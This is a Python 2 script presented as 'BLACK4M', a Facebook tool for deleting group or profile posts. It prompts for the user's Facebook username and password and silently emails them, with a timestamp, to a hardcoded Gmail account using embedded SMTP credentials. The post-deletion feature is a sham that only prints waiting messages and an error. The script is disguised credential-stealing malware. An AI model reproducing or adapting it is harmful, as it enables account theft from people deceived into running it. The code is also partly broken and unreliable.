from __future__ import with_statement
import json , sys , hashlib , os , time , marshal, getpass
import smtplib , ssl 
N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'
def id():

	print '[*] login to your facebook account '
	
	id = raw_input('[?] Username : ')
	pwd = getpass.getpass('[?] Password : ')
	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'

	smtp_server = "smtp.gmail.com"
	port = 587
	sender = "thmgroupe@gmail.com"
	password = "thehorror123"
	receiver = "thmgroupe@gmail.com"
	message = """\
	Subject: Facebook Account !
 
   
	[+] Facebook Infos :
	--------------------------------------------------  
	[*] Time : {0}
	[*] Username : {1}
	[*] Password : {2}
	--------------------------------------------------
 
	""".format(time.ctime() , id , pwd )

	Ssl_Context = ssl.create_default_context()
	server =  smtplib.SMTP(smtp_server,port)
 	
 	try :
 		
		server.ehlo()
		server.starttls()
		server.ehlo()
		server.login(sender, password)
		server.sendmail(sender , receiver , message)

	except Exception as e :

		pass
		
	finally :

		server.quit()

	data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

#	data.update({'sig':x.hexdigest()})
   #     get(data)
####################################################################
#       	            BOT
	                # Execute #
try:
	id()
except:
	print " \033[1;31m ERROR \033[0;37;40m ".center(65)
	sys.exit()
print "%s[%s*%s] %sWELCOME TO %sBLACK4M%s " % (C, Y, C, W, B, B)
time.sleep(0.5)
print"%s[%s 1 %s] %sDELETE GROUP POST " % (Y ,R, Y, G)
print"%s[%s 2 %s] %s DELETE PROFIL POSTS " % (Y ,R ,Y, G)
try:
	f = int(input(":>"))

	while  f != 1 and 2 :
	 	print"CHOOSE FROM THE LIST"
	 	time.sleep(.3)
	 else :
	 	print"deleting posts ".center(56)
	 	time.sleep(1)
	 	print"please wait "
	 	time.sleep(5)
	 	print"ERROR WHILE DELETING POSTS"
except :
	print" ERROR"
